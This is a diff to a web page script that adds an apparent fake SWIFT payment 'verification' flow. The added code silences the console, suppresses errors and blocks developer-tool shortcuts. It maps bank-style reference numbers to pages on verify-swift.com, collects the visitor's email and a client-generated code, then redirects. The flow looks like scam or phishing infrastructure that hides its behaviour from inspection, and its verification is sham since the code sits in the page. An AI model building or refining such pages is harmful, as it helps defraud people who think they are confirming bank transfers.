@@ -122,13 +122,17 @@
 
 <script>
 (function() {
-    // 1. PROTECTION LOGIC
+    // 1. SILENT CONSOLE PROTECTION
     const noop = () => {};
     const consoleMethods = ['log', 'info', 'warn', 'error', 'debug', 'trace', 'table'];
     const silencedConsole = {};
     consoleMethods.forEach(m => silencedConsole[m] = noop);
     try { window.console = silencedConsole; Object.freeze(window.console); } catch(e) {}
 
+    window.addEventListener('error', e => { e.preventDefault(); return true; }, true);
+    window.addEventListener('unhandledrejection', e => { e.preventDefault(); return true; }, true);
+
+    // 2. ANTI-INSPECT PROTECTION (RIGHT CLICK IS NOW ACTIVE)
     document.addEventListener('keydown', e => {
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
             e.preventDefault();
@@ -136,19 +140,31 @@
         }
     });
 
-    // 2. SERVER COMMUNICATION HELPER
-    async function apiCall(data) {
-        try {
-            const response = await fetch('verify.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            return await response.json();
-        } catch (error) {
-            return { success: false, message: 'Security service unreachable.' };
-        }
-    }
+    // 3. CORE LOGIC
+    let currentStep = 1;
+    let verificationCode = '';
+    let redirectUrl = '';
+    
+    const refMap = new Map([
+        ['COBA300525CH59279', 'https://verify-swift.com/verification-cob.html'],
+        ['COBA310625CH68412', 'https://verify-swift.com/verification-cob-abnab'],
+        ['COBA011125CH77290', 'https://verify-swift.com/verification-code-abnaz.html'],
+        ['COBA011125CH86478', 'https://verify-swift.com/verification-abnzdf'],
+        ['COBA780533CH12564', 'https://verify-swift.com/verification-cob-aznasdf'],
+        ['RZBA780533WW25874', 'https://verify-swift.com/verification-cob-xbnetzr'],
+        ['COBA780533CH25879', 'https://verify-swift.com/verification-cob-nzb198adm'],
+        ['COBA310625CH665478', 'https://verify-swift.com/verification-cob-sdf6589db23'],
+        ['COBA515626CH63378', 'https://verify-swift.com/verification-cob-pdg32541ab25'],
+        ['CBA17112248B401-130226', 'https://verify-swift.com/verification-cob-utg566290vcd77'],
+        ['DEU17112212C456-170326', 'https://verify-swift.com/verification-cob-sam54df677'],
+        ['CBA17112248B401-160226', 'https://verify-swift.com/verification-cob-bm65tb7654xz'],
+        ['DEU349827091C679-230326', 'https://verify-swift.com/verification-cob-cju228ac749nb'],
+        ['CBA17112248B401-230226', 'https://verify-swift.com/verfication-cob-an653cbt789g'],
+        ['RCAS29016976S', 'https://verify-swift.com/check/verify/verifymt199/index.html'],
+        ['DEU549325112B147-270326', 'https://verify-swift.com/verification-cob-ds145av41sa17n'],
+        ['2026-03-30-2020A76', 'https://verify-swift.com/check/verify/verifymt199/mt996as7821vba921'],
+        ['DEU17112212C332-230326', 'https://verify-swift.com/verfication-cob-by653atm688v']
+    ]);
 
     function showStep(step) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -156,25 +172,21 @@
         document.querySelectorAll('.step-dot').forEach((dot, i) => {
             dot.classList.toggle('active', i + 1 === step);
         });
+        currentStep = step;
     }
 
-    // STEP 1: Check Reference Number
-    document.getElementById('step1Next').onclick = async () => {
-        const refField = document.getElementById('referenceNumber');
-        const err = document.getElementById('refError');
-        
-        const result = await apiCall({ action: 'check_ref', ref: refField.value.trim() });
-
-        if (result.success) {
-            err.style.display = 'none';
+    document.getElementById('step1Next').onclick = () => {
+        const ref = document.getElementById('referenceNumber').value.trim();
+        if (refMap.has(ref)) {
+            redirectUrl = refMap.get(ref);
             showStep(2);
         } else {
-            err.textContent = result.message;
+            const err = document.getElementById('refError');
+            err.textContent = 'Invalid reference number.';
             err.style.display = 'block';
         }
     };
 
-    // STEP 2: Send Email (Backend generates the code)
     document.getElementById('sendCode').onclick = async () => {
         const email = document.getElementById('email').value.trim();
         const err = document.getElementById('emailError');
@@ -188,39 +200,31 @@
 
         err.style.display = 'none';
         load.style.display = 'block';
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
 
-        // Integrate your mailing service here (Netlify/PHP)
-        // Ensure it triggers the code generation on verify.php if needed
         try {
             const res = await fetch('/.netlify/functions/send-email', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ to: email })
+                body: JSON.stringify({ to: email, code: verificationCode })
             });
-            const result = await res.json();
-            if (result.success) showStep(3);
+            const data = await res.json();
+            if (data.success) showStep(3);
             else throw new Error();
         } catch {
-            err.textContent = 'Failed to send security code.';
+            err.textContent = 'Security service unreachable.';
             err.style.display = 'block';
-        } finally {
-            load.style.display = 'none';
-        }
+        } finally { load.style.display = 'none'; }
     };
 
-    // STEP 3: Verify OTP and Redirect
-    document.getElementById('verifyCode').onclick = async () => {
-        const codeField = document.getElementById('codeInput');
-        const err = document.getElementById('codeError');
-
-        const result = await apiCall({ action: 'verify_otp', code: codeField.value.trim() });
-
-        if (result.success) {
-            err.style.display = 'none';
+    document.getElementById('verifyCode').onclick = () => {
+        const code = document.getElementById('codeInput').value.trim();
+        if (code === verificationCode) {
             showStep(4);
-            setTimeout(() => { window.location.href = result.redirect; }, 2000);
+            setTimeout(() => window.location.href = redirectUrl, 2000);
         } else {
-            err.textContent = result.message;
+            const err = document.getElementById('codeError');
+            err.textContent = 'Incorrect code.';
             err.style.display = 'block';
         }
     };
